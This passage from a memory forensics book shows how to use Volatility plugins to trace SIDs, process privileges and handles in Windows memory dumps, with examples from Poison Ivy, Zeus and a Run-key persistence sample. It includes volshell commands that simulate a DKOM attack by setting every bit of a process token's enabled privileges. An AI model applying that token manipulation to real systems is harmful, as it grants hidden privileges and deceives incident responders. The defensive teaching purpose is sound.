This instance of `explorer.exe` belongs to a user named Jimmy, whose SID string is `S-1-5-21-[snip]-1000`. By analyzing the other SIDs in this process’ token, you can see it’s also in the `Everyone`, `LOCAL`, and `NT AUTHORITY\Authenticated Users` groups. Five privileges are also present in the token, but only one of them is currently enabled. The next few pages discuss these concepts in more detail.

### Extracting and Translating SIDs in Memory

The live APIs we just described are convenient ways to enumerate SIDs on running systems. Windows also provides the `ConvertSidToStringSid` API that translates the numerical data in a `_SID` structure to the human readable `S-1-5-[snip]` format. It also provides `LookupAccountSid` that returns an account name for a given SID. However, because we’re dealing with memory dumps, Volatility (the `getsids` plugin in particular) is responsible for finding each process’ token, extracting the numerical components of the `_SID` structure, and translating them into strings. After it is done, it maps the strings to user and group names on the local computer or domain.

You can perform the mapping in a few different ways. First, the Known SIDs (see [http://support.microsoft.com/kb/243330](http://support.microsoft.com/kb/243330)) are hardcoded into Windows and thus can be hardcoded into the Volatility plugin. They consist of SIDs such as `S-1-5` (NT Authority) and `S-1-5-32-544` (Administrators). There are also Service SIDs prefixed with `S-1-5-80`. The remainder of the SID in this case is composed of the SHA1 hash of the corresponding service name (in Unicode, uppercase)—an algorithm described in greater detail here: [http://volatility-labs.blogspot.com/2012/09/movp-23-event-logs-and-service-sids.html](http://volatility-labs.blogspot.com/2012/09/movp-23-event-logs-and-service-sids.html).

Finally, there are User SIDs such as `S-1-5-21-4010035002-774237572-2085959976-1000`. These SIDs break down into the following components:

- **S:** Prefix indicating that the string is a SID
- **1:** The revision level (version of the SID specification) from `_SID.Revision`
- **5:** The identifier authority value from `_SID.IdentifierAuthority.Value`
- **21-4010035002-774237572-2085959976:** The local computer or domain identifier from the `_SID.SubAuthority` values
- **1000:** A relative identifier that represents any user or group that doesn’t exist by default

You can map the SID string to a username by querying the registry. The following command shows an example of how to do this:

```
$ python vol.py -f memory.img --profile=Win7SP0x86 printkey -K "Microsoft\Windows
NT\CurrentVersion\ProfileList\S-1-5-21-4010035002-774237572-2085959976-1000"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile
----------------------------
Registry: User Specified
Key name: S-1-5-21-4010035002-774237572-2085959976-1000 (S)
Last updated: 2011-06-09 19:50:32 

Subkeys:

Values:
REG_EXPAND_SZ ProfileImagePath : (S) C:\Users\nkESis3ns88S
REG_DWORD     Flags           : (S) 0
REG_DWORD     State           : (S) 0
REG_BINARY    Sid             : (S) 
0x00000000  01 05 00 00 00 00 00 05 15 00 00 00 3a 47 04 ef   ............:G..
0x00000010  84 ed 25 2e 28 39 55 7c e8 03 00 00               ..%.(9U|....
[snip]
```

By appending the SID string to the `ProfileList` registry key, you can see a value named `ProfileImagePath`. The username is then defined within the profile path. In this case, the user’s name was `nkESis3ns88S` (it was a randomly generated backdoor account an attacker created to retain access to the system).

---

**NOTE**

For more information on translating SID values, see the following links:

- *Linking Processes to Users:*[http://moyix.blogspot.com/2008/08/linking-processes-to-users.html](http://moyix.blogspot.com/2008/08/linking-processes-to-users.html).
- *How to Associate a Username with a Security Identifier (SID):*[http://support.microsoft.com/kb/154599/en-us](http://support.microsoft.com/kb/154599/en-us)
- *Security Identifier Structure:*[http://technet.microsoft.com/en-us/library/cc962011.aspx](http://technet.microsoft.com/en-us/library/cc962011.aspx).

---

### Detecting Lateral Movement

If you need to associate a process with a user account or investigate potential lateral movement attempts, use the `getsids` plugin. The following output is from Jack Crook’s GrrCON forensic challenge (see [http://michsec.org/2012/09/misec-meetup-october-2012/](http://michsec.org/2012/09/misec-meetup-october-2012/)).

```
$ python vol.py –f grrcon.img --profile=WinXPSP3x86 getsids –p 1096
Volatility Foundation Volatility Framework 2.4

explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-500 (administrator)
explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-513 (Domain Users)
explorer.exe: S-1-1-0 (Everyone)
explorer.exe: S-1-5-32-545 (Users)
explorer.exe: S-1-5-32-544 (Administrators)
explorer.exe: S-1-5-4 (Interactive)
explorer.exe: S-1-5-11 (Authenticated Users)
explorer.exe: S-1-5-5-0-206541 (Logon Session)
explorer.exe: S-1-2-0 (Local (Users with the ability to log in locally))
explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-519 (Enterprise Admins)
explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-1115
explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-518 (Schema Admins)
explorer.exe: S-1-5-21-2682149276-1333600406-3352121115-512 (Domain Admins)
```

This command shows the SIDs associated with `explorer.exe` for the current logged-on user. You’ll immediately notice that one SID (`S-1-5-21-[snip]-1115`) doesn’t display an account name. On systems that don’t authenticate to a domain, you’ll see the local user’s name next to the SID. In this case, however, because Volatility doesn’t have access to the remote machine’s registry (that is, the domain controller or Active Directory server), it cannot perform the resolution.

The question you can answer with `getsids` is this: What level of access did the attacker gain? Don’t stop short after seeing that `explorer.exe` is a member of the Administrators group. The attacker on this machine actually joined the Domain and Enterprise Admins groups, allowing him to move laterally throughout the entire corporate network. In this particular scenario, the attacker combined a Poison Ivy (PI) Remote Access Trojan (RAT) with the use of a Pass the Hash (PtH) attack. You can read a full analysis of this attack here: [http://volatility-labs.blogspot.com/2012/10/solving-grrcon-network-forensics.html](http://volatility-labs.blogspot.com/2012/10/solving-grrcon-network-forensics.html).

## Privileges

Privileges are another critical component involved in security and access control. A privilege is the permission to perform a specific task, such as debugging a process, shutting down the computer, changing the time zone, or loading a kernel driver. Before a process can enable a privilege, the privilege must be present in the process’ token. Administrators decide which privileges are present by configuring them in the Local Security Policy (LSP), as shown in [Figure 6-9](#figure6-9), or programmatically by calling `LsaAddAccountRights`. You can access the LSP by going to Start ⇒ Run and typing `SecPol.msc`.

![c06f009.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f009.png)

*[**Figure 6-9:**](#figureanchor6-9) Administrators can configure privileges using the Local Security Policy editor.*

### Commonly Exploited Privileges

After a privilege is present in a process’ token, it must be enabled. The following list describes a few ways to enable privileges:

- **Enabled by default:** The LSP can specify that privileges be enabled by default when a process starts.
- **Inheritance:** Unless otherwise specified, child processes inherit the security context of their creator (parent).
- **Explicit enabling:** A process can explicitly enable a privilege using the `AdjustTokenPrivileges` API.

From a forensic perspective, you should be most concerned with the following privileges when they’ve been *explicitly* enabled. For a full list of possible privileges and their descriptions, see [http://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx).

- `SeBackupPrivilege`: This grants read access to any file on the file system, regardless of its specified access control list (ACL). Attackers can leverage this privilege to copy locked files.
- `SeDebugPrivilege`: This grants the ability to read from or write to another process’ private memory space. It allows malware to bypass the security boundaries that typically isolate processes. Practically all malware that performs code injection from user mode relies on enabling this privilege.
- `SeLoadDriverPrivilege`: This grants the ability to load or unload kernel drivers.
- `SeChangeNotifyPrivilege`: This allows the caller to register a callback function that gets executed when specific files and directories change. Attackers can use this to determine immediately when one of their configuration or executable files are removed by antivirus or administrators.
- `SeShutdownPrivilege`: This allows the caller to reboot or shut down the system. Some infections, such as those that modify the Master Boot Record (MBR) don’t activate until the next time the system boots. Thus, you’ll often see malware trying to manually speed up the procedure by invoking a reboot. **NOTE** Cem Gurkok helped design the Volatility support for analyzing privileges in memory. You can read his presentation, *Reverse Engineering with Volatility on a Live System: The Analysis of Process Token Privileges*, here: [http://volatility-labs.blogspot.com/2012/10/omfw-2012-analysis-of-process-token.html](http://volatility-labs.blogspot.com/2012/10/omfw-2012-analysis-of-process-token.html).

### Analyzing Explicit Privileges

The reason why we’re typically most interested in explicitly enabled privileges is because it shows awareness, or intent. If a process can change the time zone, because the LSP gives *all* processes that capability or because its parent process had that capability, that doesn’t really tell you anything about the intended functionality of the process. On the other hand, if a process explicitly enabled the privilege to change time zones, you can bet it will try changing the time zone.

Here’s the output of the Volatility `privs` plugin. You’ll see the privilege name along with its attributes (present, enabled, and/or enabled by default).

```
$ python vol.py -f grrcon.img privs -p 1096
Volatility Foundation Volatility Framework 2.4
Pid    Process       Privilege                       Attributes               
------ ------------- ------------------------------- ------------------------
1096   explorer.exe  SeChangeNotifyPrivilege         Present,Enabled,Default  
1096   explorer.exe  SeShutdownPrivilege             Present                  
1096   explorer.exe  SeUndockPrivilege               Present,Enabled          
1096   explorer.exe  SeSecurityPrivilege             Present                  
1096   explorer.exe  SeBackupPrivilege               Present                  
1096   explorer.exe  SeRestorePrivilege              Present                  
1096   explorer.exe  SeSystemtimePrivilege           Present                  
1096   explorer.exe  SeRemoteShutdownPrivilege       Present                  
1096   explorer.exe  SeTakeOwnershipPrivilege        Present                  
1096   explorer.exe  SeDebugPrivilege                Present,Enabled          
1096   explorer.exe  SeSystemEnvironmentPrivilege    Present                  
1096   explorer.exe  SeSystemProfilePrivilege        Present                  
1096   explorer.exe  SeProfileSingleProcessPrivilege Present                  
1096   explorer.exe  SeIncreaseBasePriorityPrivilege Present                  
1096   explorer.exe  SeLoadDriverPrivilege           Present,Enabled          
1096   explorer.exe  SeCreatePagefilePrivilege       Present                  
1096   explorer.exe  SeIncreaseQuotaPrivilege        Present                  
1096   explorer.exe  SeManageVolumePrivilege         Present                  
1096   explorer.exe  SeCreateGlobalPrivilege         Present,Enabled,Default  
1096   explorer.exe  SeImpersonatePrivilege          Present,Enabled,Default  
```

You can see several privileges present in the output. Only six of them are enabled, but three are enabled by default. Thus, you can conclude that `explorer.exe` explicitly enabled the undock privilege, debug privilege, and load driver privilege. You’ll realize over time that `explorer.exe` always enables the undock privilege, so that one is not concerning. But why does Windows Explorer need to debug other processes and load kernel drivers? The answer is simple: It doesn’t! This process is hosting an injected Poison Ivy (PI) sample, and PI explicitly enabled the privileges.

### Detecting Token Manipulation

As previously mentioned, the Windows API (`AdjustTokenPrivileges`) does not, and *should* not, allow enabling a privilege that isn’t present in a token. Thus, it makes sense that APIs such as `GetTokenInformation` (and tools based on this API) would first check what’s present and then return the enabled subset. Here’s the catch: A talented researcher, Cesar Cerrudo, discovered that when checking to see if a process can perform a task, the kernel cares only about what’s enabled. As a result, Cesar proposed in his paper, *Easy Local Windows Kernel Exploitation* (see [https://www.blackhat.com/html/bh-us-12/bh-us-12-archives.html#Cerrudo](https://www.blackhat.com/html/bh-us-12/bh-us-12-archives.html#Cerrudo)), a method to bypass Windows APIs and enable all privileges for a process, even without them being present.

#### Attack Simulation with Volshell

Cesar’s attack is based on the DKOM approach. He locates the `_SEP_TOKEN_PRIVILEGES` structure for the target process and sets the 64-bit `Enabled` member to `0xFFFFFFFFFFFFFFFF`. This effectively enables all possible privileges. He does *not* update the `Present` member, so it will reflect only the privileges that were present before the attack. To simulate these steps, you can use Volatility in write mode to modify a VM’s memory. When you’re done, resume the VM, and the changes will take effect. This is easier than writing a kernel driver—especially when it’s just for testing purposes.

```
$ python vol.py -f VistaSP0x64.vmem --profile=VistaSP2x64 volshell --write
Volatility Foundation Volatility Framework 2.4
Write support requested.  Please type "Yes, I want to enable write support" 
Yes, I want to enable write support
Current context: process System, pid=4, ppid=0 DTB=0x124000
To get help, type 'hh()'
>>> cc(pid = 1824)
Current context: process explorer.exe, pid=1824, ppid=1668 DTB=0x918d000
```

Now that you’re in the target process’ context, obtain a pointer to its `_TOKEN` structure. Then you can print the 64-bit numbers as a binary string, like this:

```
>>> token = proc().get_token()
>>> bin(token.Privileges.Present)
'0b11000000010100010000000000000000000'
>>> bin(token.Privileges.Enabled)
'0b100000000000000000000000'
```

The next commands set all bits in the `Enabled` member and reprint the values to verify that it indeed has been updated. Then, you can quit the shell.

```
>>> token.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
>>> bin(token.Privileges.Present)
'0b11000000010100010000000000000000000'
>>> bin(token.Privileges.Enabled)
'0b1111111111111111111111111111111111111111111111111111111111111111'
>>> quit()
```

[Figure 6-10](#figure6-10) shows how the kernel data structure appears after the manipulation.

---

**NOTE**

[Figure 6-10](#figure6-10) is not drawn to scale (the members shown aren’t actually 64 bits wide). Also, if you want to see the exact bit position mappings, look in the `volatility/plugins/privileges.py` source file.

---

![c06f010.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f010.png)

*[**Figure 6-10:**](#figureanchor6-10) All bits in the Enabled member have been set by directly modifying the structure in kernel memory.*

According to the previous `volshell` output *and* [Figure 6-10](#figure6-10), only five bits are set in the `Present` member, which means that a maximum of five privileges are reported by tools running on the live system. [Figure 6-11](#figure6-11) shows how this appears in Process Explorer:

![c06f011.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f011.png)

*[**Figure 6-11:**](#figureanchor6-11) Process Explorer is tricked into reporting that only five privileges are enabled.*

As expected, it shows that only five privileges are enabled.

#### Revealing the Truth

However, if you analyze the VM memory dump using the `privs` plugin, which does *not* use the same logic as the Windows API, you’ll see that all privileges are enabled, yet many of them are not even present (which should never happen). Thus, `explorer.exe` can carry out any task it desires, and live tools on the system continue to report that those capabilities don’t exist.

```
$ python vol.py -f VistaSP0x64.vmem --profile=VistaSP2x64 privs -p 1824
Volatility Foundation Volatility Framework 2.4
Pid   Process       Privilege                        Attributes        
----- ------------  -------------------------------- --------------------
1824  explorer.exe  SeCreateTokenPrivilege           Enabled                  
1824  explorer.exe  SeAssignPrimaryTokenPrivilege    Enabled                  
[snip]             
1824  explorer.exe  SeRestorePrivilege               Enabled                  
1824  explorer.exe  SeShutdownPrivilege              Present,Enabled          
1824  explorer.exe  SeDebugPrivilege                 Enabled                  
1824  explorer.exe  SeAuditPrivilege                 Enabled                  
1824  explorer.exe  SeSystemEnvironmentPrivilege     Enabled                  
1824  explorer.exe  SeChangeNotifyPrivilege          Present,Enabled,Default  
1824  explorer.exe  SeRemoteShutdownPrivilege        Enabled                  
1824  explorer.exe  SeUndockPrivilege                Present,Enabled          
1824  explorer.exe  SeSyncAgentPrivilege             Enabled                  
[snip]            
1824  explorer.exe  SeRelabelPrivilege               Enabled                  
1824  explorer.exe  SeIncreaseWorkingSetPrivilege    Present,Enabled          
1824  explorer.exe  SeTimeZonePrivilege              Present,Enabled          
1824  explorer.exe  SeCreateSymbolicLinkPrivilege    Enabled   
```

One caveat to Cesar’s attack is that you need kernel-level access in the first place to modify the `_SEP_TOKEN_PRIVILEGES` structure. However, the point was to prolong access to a system by deceiving live tools and incident responders—not to exploit a privilege escalation vulnerability.

## Process Handles

A *handle* is a reference to an open instance of a kernel object, such as a file, registry key, mutex, process, or thread. As discussed in Chapter 5, there are close to 40 different types of kernel objects. By enumerating and analyzing the specific objects a process was accessing at the time of a memory capture, it is possible to arrive at a number of forensically relevant conclusions—such as what process was reading or writing a particular file, what process accessed one of the registry run keys, and which process mapped remote file systems.

### Lifetime of a Handle

Before a process can access an object, it first opens a handle to the object by calling an API such as `CreateFile`, `RegOpenKeyEx`, or `CreateMutex`. These APIs return a special Windows data type called `HANDLE`, which is simply an index into a process-specific handle table. For example, when you call `CreateFile`, a pointer to the corresponding `_FILE_OBJECT` in kernel memory is placed in the first available slot in the calling process’ handle table, and the respective index (such as `0x40`) is returned. Additionally, the handle count for the object is incremented. The calling process then passes the `HANDLE` value to functions that perform operations on the object, such as reading, writing, waiting, or deleting. Thus, APIs such as `ReadFile` and `WriteFile` work in the following manner:

1. Find the base address of the calling process’ handle table.
2. Seek to index `0x40`.
3. Retrieve the `_FILE_OBJECT` pointer.
4. Carry out the requested operation.

When a process is finished using an object, it should close the handle by calling the appropriate function (`CloseHandle`, `RegCloseHandle`, and so on). These APIs decrement the object’s handle count and remove the pointer to the object from the process’ handle table. At this point, the handle table index can be reused to store another type of object. However, the actual object (i.e., the `_FILE_OBJECT`) will not be freed or overwritten until the handle count reaches zero, which prevents one process from deleting an object that is currently in use by another process.

---

**NOTE**

The handle table model was designed for both convenience and security. It’s convenient because you don’t have to pass the full name or path of an object each time you perform an operation—only when you initially open or create the object. For security purposes, it also helps to conceal the addresses of objects in kernel memory. Because processes in user mode should never directly access kernel objects, there’s no reason why they would need the pointers. Furthermore, the model provides a centralized way for the kernel to monitor access to kernel objects, thus giving it the chance to enforce security based on SIDs and privileges.

---

### Reference Counts and Kernel Handles

So far in this section, we’ve been referring to processes as the entities that interact with objects via handles. However, kernel modules, or threads in kernel mode, can call the equivalent kernel APIs (i.e., `NtCreateFile`, `NtReadFile`, `NtCreateMutex`) in a similar manner. In this case, the handles are allocated from the `System` (PID 4) process’ handle table. Thus, when you dump the handles of the `System` process, you’re actually seeing all the currently open resources requested by kernel modules.

It’s also possible for code in the kernel to access existing objects directly, without first opening handles. For example, as long as the address of the object is known, you can use `ObReferenceObjectByPointer`. This API increments the reference count, rather than the handle count, so the OS will not delete the object while it’s still being referenced. Obviously, calling `ObDereferenceObject` is recommended, or else the objects may persist unnecessarily (this is known as a handle or reference leak). Although leaks are bad for performance, they’re good for forensics—it is like an attacker failing to clean up the crime scene.

In many cases, even if handles are closed, and references are released, there’s still a chance that you can find the objects by scanning the physical address space, as described in Chapter 5. Of course, they wouldn’t be associated with a process’ handle table at that point, but their presence in RAM can still lend clues to your investigations. Likewise, after a process terminates, its handle table is destroyed, but that doesn’t mean all objects created by the process are destroyed at the same time.

---

## **Analysis Objectives**

Your objectives are these:

- **Handle table internals:** Learning the internals of handles and handle tables can give you a greater understanding of the objects and artifacts you find in memory dumps.
- **Targeted object attribution**: Given an indicator such as a filename, registry key path, mutex, or other object—you can trace it back to the process, or processes responsible for creating or accessing it.
- **Open-ended investigations**: If you don’t have a specific list of initial indicators, you can still gain a great deal of knowledge about the behaviors and intentions of an unknown process by analyzing the contents of its handle table.
- **Detect registry persistence**: Learn how to analyze open registry handles to determine which keys a process uses to store its configuration or persistence data.
- **Identify remote mapped drives**: Adversaries frequently look for IP addresses and names of other computers in the workgroup or domain and then try to map them for remote read or write access. You’ll learn how to find evidence of exactly which systems and paths were accessed by looking in handle tables.

---

### Handle Table Internals

Each process’ `_EPROCESS.ObjectTable` member points to a handle table (`_HANDLE_TABLE`). This structure has a `TableCode` that serves two critical purposes: It specifies the number of levels in the table and it points to the base address of the first level. All processes start out with a single-level table, which is shown in [Figure 6-12](#figure6-12). The table size is one page (4096 bytes), and this scheme allows for up to 512 handles on a 32-bit system or 256 on a 64-bit system. Indexes in the table contain `_HANDLE_TABLE_ENTRY` structures if they’re in use; otherwise, they’re zeroed out.

The handle table entries contain an `Object` member that points to the `_OBJECT_HEADER` of the corresponding object. By navigating these fields, you can locate both the object name and the object body (i.e., `_FILE_OBJECT`, `_EPROCESS`).

Some processes require more open handles than the single-level table permits. Thus, Windows can expand on-demand to a scheme involving up to three levels. For example, in a two-level table, the first level is still a 4096-byte block of memory, but it is divided up into 1024 slots (32-bit) or 512 slots (64-bit). Each slot stores a pointer to an array of `_HANDLE_TABLE_ENTRY` structures. Thus, on a 32-bit platform, the two-level handle table can support up to 1024 * 512 = 524,288 handles.

![c06f012.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f012.png)

*[**Figure 6-12:**](#figureanchor6-12) A diagram of a single-level handle table*

Similarly, a three-level table on a 32-bit system can theoretically support 1024 * 1024 * 512 = 536,870,912 handles. However, as described in “Pushing the Limits of Windows: Handles” ([https://blogs.technet.com/b/markrussinovich/archive/2009/09/29/3283844.aspx](https://blogs.technet.com/b/markrussinovich/archive/2009/09/29/3283844.aspx)), the observed limits are actually far fewer. For one, the kernel enforces a hard-coded limit of about 16 million. Additionally, any process that requires more than several thousand open handles concurrently is probably experiencing a handle table leak (i.e., forgetting to close its handles). Thus, the hard-coded maximum serves as an early indicator of poorly written applications.

---

## **Data Structures**

The output that follows shows the handle table and handle table entry structure for 64-bit Windows 7 systems:

```
>>> dt("_HANDLE_TABLE")
'_HANDLE_TABLE' (104 bytes)
0x0   : TableCode                    ['unsigned long long']
0x8   : QuotaProcess                 ['pointer64', ['_EPROCESS']]
0x10  : UniqueProcessId              ['pointer64', ['void']]
0x18  : HandleLock                   ['_EX_PUSH_LOCK']
0x20  : HandleTableList              ['_LIST_ENTRY']
0x30  : HandleContentionEvent        ['_EX_PUSH_LOCK']
0x38  : DebugInfo                    ['pointer64', ['_HANDLE_TRACE_DEBUG_INFO']]
0x40  : ExtraInfoPages               ['long']
0x44  : Flags                        ['unsigned long']
0x44  : StrictFIFO                   ['BitField', 
   {'end_bit': 1, 'start_bit': 0, 'native_type': 'unsigned char'}]
0x48  : FirstFreeHandle              ['unsigned long']
0x50  : LastFreeHandleEntry          ['pointer64', ['_HANDLE_TABLE_ENTRY']]
0x58  : HandleCount                  ['unsigned long']
0x5c  : NextHandleNeedingPool        ['unsigned long']
0x60  : HandleCountHighWatermark     ['unsigned long']

>>> dt('_HANDLE_TABLE_ENTRY')
'_HANDLE_TABLE_ENTRY' (16 bytes)
0x0   : InfoTable                    ['pointer64', ['_HANDLE_TABLE_ENTRY_INFO']]
0x0   : ObAttributes                 ['unsigned long']
0x0   : Object                       ['_EX_FAST_REF']
0x0   : Value                        ['unsigned long long']
0x8   : GrantedAccess                ['unsigned long']
0x8   : GrantedAccessIndex           ['unsigned short']
0x8   : NextFreeTableEntry           ['unsigned long']
0xa   : CreatorBackTraceIndex        ['unsigned short']
```

## **Key Points**

The key points for `_HANDLE_TABLE` are these:

- `TableCode`: This value tells you the number of levels in the table and points to the address of the top-level table. The dual purpose is achieved using a bit mask of seven (7). For example, to obtain the number of tables, you can compute `TableCode & 7`; and to obtain the address, you can compute `TableCode & ~7`.
- `QuotaProcess`: A pointer to the process to which the handle table belongs. It can come in handy if you find handle tables using the pool-scanning approach described in Chapter 5 rather than enumerating processes and following their `ObjectTable` pointer.
- `HandleTableList`: A linked list of process handle tables in kernel memory. You can use it to locate other handle tables—potentially even those for processes that have been unlinked from the process list.
- `HandleCount`: The total number of handle table entries that are currently in use by the process. This field was removed starting in Windows 8 and Server 2012.

The key points for `_HANDLE_TABLE_ENTRY` are these:

- `Object`: This member points to the `_OBJECT_HEADER` of the corresponding object. The `_EX_FAST_REF` is a special data type that combines reference count information into the least significant bits of the pointer.
- `GrantedAccess`: A bit mask that specifies the granted access rights (read, write, delete, synchronize, etc.) that the owning process has obtained for the object.

---

## Enumerating Handles in Memory

The Volatility `handles` plugin generates output by walking the handle table data structures. Using this plugin without any options generates the most verbose output: all handles for all object types in all processes. So you should learn about a few filtering options:

- **Filter by process ID**: You can pass one or more (comma-separated) process IDs to the `-p/--pid` option.
- **Filter by process offset**: You can supply the physical offset of an `_EPROCESS` structure to the `-o/--offset` option.
- **Filter by object type**: If you’re interested in only a particular type of object, such as files or registry keys, you can specify the appropriate name(s) to the `-t/--object-type` option. See Chapter 5 or enter `!object \ObjectTypes` into Windbg to see the full list of object types.
- **Filter by name**: Not all objects have names. Unnamed objects are obviously useless when searching for indicators by name, so one way to reduce noise is to use the `--silent` option, which suppresses handles to unnamed objects.

### Finding Zeus Indicators

The following output shows the first few handles from PID 632 (`winlogon.exe`). The memory dump is from an older 32-bit XP system infected with Zeus ([https://code.google.com/p/malwarecookbook/source/browse/trunk/17/1/zeus.vmem.zip](https://code.google.com/p/malwarecookbook/source/browse/trunk/17/1/zeus.vmem.zip)). However, it’s difficult to discern the infection because the process has about 550 open handles (truncated for brevity) to different types of objects—and you may not immediately recognize them all.

---

**NOTE**

Recipe 9-5 of the *Malware Analyst’s Cookbook* includes source code for a C program that compares handles across all processes on the system to examine the effects of code injection. The code is based on the same API (`NtQuerySystemInformation`) that most tools on the running system use to enumerate handles. The code is available here: [https://code.google.com/p/malwarecookbook/source/browse/trunk/9/5/HandleDiff-src.zip](https://code.google.com/p/malwarecookbook/source/browse/trunk/9/5/HandleDiff-src.zip).

---

```
$ python vol.py -f zeus.vmem --profile=WinXPSP3x86 -p 632 handles 
Volatility Foundation Volatility Framework 2.4
Offset(V)     Pid     Handle     Access Type             Details
---------- ------ ---------- ---------- ---------------- -------
0xc10e007e18    632        0x4    0xc00f003 KeyedEvent       CritSecOutOfMemoryEvent
0xe1533748    632        0x8        0x3 Directory        KnownDlls
0xe17289f0    632       0x10  0x20f003f Key              MACHINE
0xc15e033d28    632       0x14    0xf000f Directory        Windows
0xc17e028b10    632       0x18  0x21c00f001 Port             
0xe16defd8    632       0x1c    0xf001f Section          
0x80ffa9c8    632       0x20  0x21c00f003 Event            
0xe1571708    632       0x24    0x2000f Directory        BaseNamedObjects
0x80f618e8    632       0x28   0x1c00f003 Event            crypt32LogoffEvent
[snip]
```

As shown in the next example, you can limit your search to files and mutexes opened by PID 632 and ignore unnamed objects. Although you’ll still see about 150 items (in this particular memory dump), the well-known Zeus artifacts are much easier to identify. For example, you see the `user.ds` and `local.ds` files, which contain the configuration and stolen data. The `sdra64.exe` file in the `system32` directory is the initial Zeus installer.

```
$ python vol.py -f zeus.vmem --profile=WinXPSP3x86 -p 632 handles 
      -t File,Mutant 
      --silent
Volatility Foundation Volatility Framework 2.4
Offset(V)     Pid     Handle     Access Type             Details
---------- ------ ---------- ---------- ---------------- -------
[snip]
0x80ff7b90    632      0x104   0x120089 File             
\Device\HarddiskVolume1\WINDOWS\system32\lowsec\user.ds
 [snip]
0xff12bb40    632      0x644   0x120089 File             
\Device\HarddiskVolume1\WINDOWS\system32\sdra64.exe
0xff13a470    632      0x648   0x120089 File             
\Device\HarddiskVolume1\WINDOWS\system32\lowsec\local.ds
0xff1e6b10    632      0x6dc   0x120116 File             \Device\Tcp
0xff1e6a38    632      0x6e0   0x1200a0 File             \Device\Tcp
0xff206778    632      0x6e4   0x1200a0 File             \Device\Ip
0xff1c66e010    632      0x6e8   0x100003 File             \Device\Ip
0xff1c65e078    632      0x6ec   0x1200a0 File             \Device\Ip
0x80f5cd78    632      0x898   0x12019f File             
\Device\NamedPipe\_AVIRA_2109
0xff1e7dc0    632      0x8bc   0x1c00f001 Mutant           _AVIRA_2109
```

You also may notice several open handles to `\Device\Tcp` and `\Device\Ip`. These are obviously different from the handles to files prefixed with `\Device\HarddiskVolume1`. Specifically, `Tcp` and `Ip` are *not* files on the machine’s hard drive. This is described in Chapter 11, but what you’re essentially seeing are artifacts of network sockets that the process creates. Although sockets aren’t files, they support similar operations such as opening, reading, writing, and deleting. As a result, the same handle/descriptor subsystem can service both files and network sockets.

Along the same lines, named pipes are also represented as file objects. Thus, if malware creates a named pipe for interprocess communication or to redirect output of a backdoor command shell into a file, you can determine which processes are involved in that activity, provided that you know the name of the pipe it creates. In this case, it’s easy to identify because the name of the pipe that Zeus uses is the same as the standard mutex it creates to mark its presence on systems (`_AVIRA_`).

### Detecting Registry Persistence

Malware often leverages the registry for persistence. To write the pertinent values, the malicious process must first open a handle to the desired registry key. In the following example, you’ll see how obvious it is when malware chooses a well-known location (such as the Run key) and also suffers from a handle leak. You should not only recognize the registry key name but also the fact that you have numerous open handles to the same key. Here is how the output appears:

```
$ python vol.py -f laqma.mem --profile=WinXPSP3x86 handles
      --object-type=Key 
      --pid=1700
Volatility Foundation Volatility Framework 2.4
Offset(V)     Pid     Handle     Access Type             Details
---------- ------ ---------- ---------- ---------------- -------
0xe12b6cb0   1700       0x10  0x20f003f Key              MACHINE
0xe12ae0e8   1700       0x60    0xf003f Key              
MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9
0xe17a1c08   1700       0x68    0xf003f Key              
MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\NAMESPACE_CATALOG5
0xe12382d8   1700       0x88    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe1ee99a8   1700       0x90    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe1fc7f18   1700       0x94    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe161bfb8   1700       0x98    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe18bbaf8   1700       0x9c    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe12a0348   1700       0xa0    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe1307598   1700       0xa4    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe150fb88   1700       0xa8    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
0xe12e38f0   1700       0xac    0xf003f Key              
MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
[snip]
```

The process has nearly 20 open handles to the `RUN` key (not all are shown). This is indicative of a bug in the code that fails to close its handles after opening them. In this case, most likely there’s a loop that executes periodically to ensure that the persistence values are still intact (just in case an antivirus product or administrator removed them). Of course, the artifacts won’t always be this obvious, and just because a handle to a key is open, that doesn’t mean the process added values. However, you can always confirm your suspicions by using the `printkey` plugin (see Chapter 10) to look at the actual data that the key contains:

```
$ python vol.py -f laqma.mem printkey -K "MICROSOFT\WINDOWS\CURRENTVERSION\RUN"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
Key name: Run (S)
Last updated: 2012-11-28 03:05:07 UTC+0000

Subkeys:

Values:
REG_SZ        BluetoothAuthenticationAgent : (S) rundll32.exe 
bthprops.cpl,,BluetoothAuthenticationAgent
REG_SZ        VMware User Process : (S) 
      "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
REG_SZ        lanmanwrk.exe   : (S) 
      C:\WINDOWS\System32\lanmanwrk.exe
